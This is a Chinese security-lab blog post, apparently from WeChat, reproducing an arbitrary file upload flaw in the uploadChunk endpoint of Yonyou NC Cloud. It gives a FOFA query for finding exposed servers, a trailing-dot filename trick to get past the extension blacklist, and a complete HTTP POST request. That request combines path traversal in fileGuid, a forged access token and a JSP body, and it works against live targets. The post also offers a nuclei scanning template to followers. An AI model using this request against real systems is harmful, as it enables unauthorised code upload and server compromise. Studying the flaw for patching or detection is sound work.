#  用友 NC Cloud uploadChunk 任意文件上传

原创 blkx  [ 天澜实验室 ](javascript:void\(0\);)

**天澜实验室** ![]()

微信号 gh_c5fea27198a7

功能介绍 观水有术，必观其澜！
专注于感知国内外常见系统的漏洞态势，对漏洞进行分析、复现、武器化形成。涵盖漏洞复现、攻防演练、应急响应、工具开发等知识内容。秉承“没有网络安全就没有国家安全”的宗旨，热衷并服务于网络安全事业。

____

___发表于_

收录于合集 #漏洞复现 17个

![]()

**请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习交流使用，如若非法他用，与平台和本文作者无关，需自行负责！**

 **00**

 **漏洞概述**

![]()

用友 NC Cloud系统，uploadChunk 接口存在任意文件上传漏洞。

 **01**

 **空间搜索语法**

![]()

fofa

app="用友-NC-Cloud"

![]()

 **02**

 **利用过程**

![]()

登录界面

![]()

uploadChunk接口存在任意文件上传漏洞。

![]()

正常上传会被拦截，此处利用windows特性绕过黑名单限制。

  * 

    
    
    filename="xxx.jsp."

  *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0Content-Length: 173accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQAccept-Encoding: gzip, deflate, brConnection: closeContent-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9  
    --024ff46f71634a1c9bf8ec5820c26fa9Content-Disposition: form-data; name="file"; filename="xxx.jsp."  
    <% out.println("Hello"); %>--024ff46f71634a1c9bf8ec5820c26fa9--

漏洞存在响应包如下：

![]()

![]()

 **03**

 **nuclei**

![]()

![]()

获取脚本关注本公众号后发送：用友NCCloud1

  

✓

关注我们

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

